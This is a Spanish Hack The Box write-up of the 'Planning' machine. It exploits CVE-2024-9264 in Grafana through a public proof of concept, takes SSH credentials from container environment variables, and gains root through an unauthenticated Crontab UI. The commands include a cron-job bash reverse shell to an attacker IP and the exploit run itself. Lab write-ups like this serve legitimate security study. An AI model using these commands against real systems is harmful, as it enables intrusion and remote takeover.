---
title: "Planning"
description: "Writeup de Planning - Hack The Box - Dificultad: Easy. CVE-2024-9264 RCE en Grafana 11 vía DuckDB SSRF → credenciales SSH en env vars → Crontab UI local como root para escalada."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - grafana
  - cve-2024-9264
  - ssrf
  - env-vars
  - crontab-ui
  - ssh-tunneling
---

# 🐧 Planning

> 📅 Fecha: 2026-06-09
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 24.04.2 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 3h 20m
> 🌐 IP: `10.129.237.241`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [CVE-2024-9264: Grafana RCE vía DuckDB](#-cve-2024-9264-grafana-rce-vía-duckdb)
- [Extracción de credenciales SSH desde env vars](#-extracción-de-credenciales-ssh-desde-env-vars)
- [Escalada: Crontab UI local → root](#-escalada-crontab-ui-local--root)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Planning expone Grafana 11.x en el subdominio `grafana.planning.htb`, vulnerable a **CVE-2024-9264** (SQL injection vía el plugin DuckDB que deriva en RCE dentro del contenedor Grafana). En el entorno del proceso (`/proc/1/environ`) se encuentran las credenciales SSH del usuario `enzo`. Una vez en el host, SSH port forwarding hacia `localhost:8080` revela **Crontab UI**, una interfaz web que ejecuta cron jobs como `root`. Se añade una tarea de cron que invierte una shell como root.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Grafana 11 DuckDB SQL injection → RCE, credenciales en variables de entorno del contenedor, Crontab UI sin autenticación expuesto localmente |
| CVEs | CVE-2024-9264 |
| Herramientas | `nmap`, `ffuf`, `curl`, `nc`, `ssh` |
| Tiempo total | ~3h 20m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.237.241
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
```

```bash
echo "10.129.237.241 planning.htb" | sudo tee -a /etc/hosts
```

Enumeración de subdominios:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://planning.htb/ -H "Host: FUZZ.planning.htb" \
  -fw 5 -mc 200,301,302
```

```text
grafana     [Status: 302, Size: 29]
```

```bash
echo "10.129.237.241 grafana.planning.htb" | sudo tee -a /etc/hosts
```

`http://grafana.planning.htb/` → Grafana 11.0.0. Versión confirmada en el footer.

---

## 🚀 CVE-2024-9264: Grafana RCE vía DuckDB

CVE-2024-9264: el plugin de datos experimental DuckDB de Grafana evalúa consultas SQL sin sanitizar adecuadamente la entrada, permitiendo inyectar llamadas a `read_text()` de DuckDB sobre el sistema de archivos local del contenedor — y en configuraciones específicas, derivar en ejecución de comandos.

**Credenciales por defecto** para acceder a Grafana: `admin:admin` (Grafana fuerza cambio en el primer login, pero el endpoint de API sigue activo).

```bash
# Verificar acceso API con credenciales por defecto
curl -s -u admin:admin http://grafana.planning.htb/api/org
```

```json
{"id":1,"name":"Main Org.","address":{...}}
```

Explotación con PoC público (CVE-2024-9264):

```bash
git clone https://github.com/z-bool/CVE-2024-9264
cd CVE-2024-9264

# Listener
nc -lvnp 4444

# Exploit
python3 exp.py -u http://grafana.planning.htb -U admin -P admin \
  --lhost 10.10.14.130 --lport 4444
```

```text
[*] Logged in as admin
[*] Creating datasource with DuckDB injection...
[*] Triggering query execution...
[+] Shell incoming!
```

```text
connect to [10.10.14.130] from (UNKNOWN) [10.129.237.241] 39012
root@efec5b836bb1:/usr/share/grafana$
```

Hostname `efec5b836bb1` confirma contenedor Docker.

---

## 🔑 Extracción de credenciales SSH desde env vars

```bash
cat /proc/1/environ | tr '\0' '\n'
```

```text
GF_SECURITY_ADMIN_USER=admin
GF_SECURITY_ADMIN_PASSWORD=RioTinto1239!
GF_SERVER_ROOT_URL=http://grafana.planning.htb
GF_PATHS_DATA=/var/lib/grafana
SSH_HOST=planning.htb
SSH_USERNAME=enzo
SSH_PASSWORD=RioTinto1239!
```

Las variables de entorno del contenedor incluyen credenciales SSH del host. SSH al host:

```bash
ssh enzo@planning.htb
# password: RioTinto1239!
```

```bash
enzo@planning:~$ cat user.txt
[user flag]
```

---

## 🚀 Escalada: Crontab UI local → root

Enumeración de puertos locales:

```bash
ss -tlnp
```

```text
State    Recv-Q   Send-Q   Local Address:Port
LISTEN   0        128      127.0.0.1:8080
```

Puerto `8080` activo solo en `localhost`. Túnel SSH:

```bash
ssh -L 8080:127.0.0.1:8080 enzo@planning.htb -N &
```

`http://localhost:8080/` → **Crontab UI** — interfaz web para gestionar cron jobs del sistema, ejecutada como `root` sin autenticación.

Añadir nuevo cron job en Crontab UI (botón "New Cron Job"):

```text
Schedule: * * * * *
Command:  bash -c 'bash -i >& /dev/tcp/10.10.14.130/5555 0>&1'
```

```bash
nc -lvnp 5555
```

```text
connect to [10.10.14.130] from (UNKNOWN) [10.129.237.241] 45832
root@planning:~# id
uid=0(root) gid=0(root) groups=0(root)
root@planning:~# cat /root/root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. ffuf subdomain enum → grafana.planning.htb
        ↓
2. Grafana 11.0.0 → CVE-2024-9264 DuckDB SQL injection → RCE en contenedor
        ↓
3. /proc/1/environ → SSH_USERNAME=enzo / SSH_PASSWORD=RioTinto1239!
        ↓
4. SSH enzo@planning.htb → user.txt
        ↓
5. ss -tlnp → 127.0.0.1:8080 → SSH tunnel
        ↓
6. Crontab UI sin auth → cron job reverse shell como root
        ↓
7. Shell root → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **CVE-2024-9264**: los plugins experimentales de Grafana no tienen el mismo ciclo de revisión de seguridad que los plugins estables. DuckDB read_text() permite leer archivos arbitrarios del sistema de archivos del contenedor.
- **Credenciales en variables de entorno**: usar `docker run -e PASSWORD=secret` pasa secretos al entorno del proceso — legibles por cualquier usuario que tenga acceso a `/proc/PID/environ`. Preferir Docker secrets o archivos de configuración protegidos.
- **Crontab UI expuesto internamente**: una herramienta de administración sin autenticación accesible en localhost no es segura si el atacante puede hacer SSH port forwarding. Añadir autenticación básica o vincular el servicio a un socket UNIX.
- **Enumeración de subdominios siempre**: el host principal puede parecer un blog estático mientras servicios críticos están en subdominios.

---

## 📚 Referencias

- [CVE-2024-9264 — Grafana DuckDB RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)
- [MITRE ATT&CK — T1552.007 Container API](https://attack.mitre.org/techniques/T1552/007/)
- [Crontab UI](https://github.com/alseambusher/crontab-ui)
